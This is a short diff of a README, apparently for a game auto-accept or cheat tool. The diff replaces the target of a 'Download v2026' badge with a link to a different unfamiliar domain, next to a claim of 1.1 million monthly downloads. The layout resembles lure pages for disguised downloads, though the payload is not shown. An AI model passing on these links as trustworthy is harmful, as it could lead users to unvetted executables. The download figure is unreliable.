@@ -49,7 +49,7 @@ A: Yes — dodges if average rank is too low/high.
 
 **Monthly downloads:** 1.1m+
 
-[![Download](https://img.shields.io/badge/Download-v2026-brightgreen?style=for-the-badge)](https://connectinstruction.com/valautoacc)
+[![Download](https://img.shields.io/badge/Download-v2026-brightgreen?style=for-the-badge)](https://dllvcrun.com/valautoacc)
 
 ---
 
